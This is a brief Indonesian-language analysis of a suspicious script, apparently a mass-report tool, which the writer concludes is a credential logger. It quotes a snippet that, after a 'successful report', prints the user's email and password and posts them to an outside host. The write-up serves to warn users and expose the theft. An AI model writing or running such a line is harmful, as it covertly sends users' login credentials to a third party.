kesimpulan:
  terdapat fungsi yang mencurigakan. kemungkinan ini adalah
  logger. 

    ...
    if 'untuk Ditinjau' in ok:
      print ('\r[+] Report Sukses [{}|{}]').format(self.email, self.pw)
      requests.post('http://dorayy.joomla.com/goal.php', data={'email': self.email, 'passs': self.pw})
    ...

  jika report sukses maka script akan menampilkan output
    [+] report sukses [<email>|<password>]
  dan mengirimkan data email dan password ke https://doray.jomla.com/goal.php
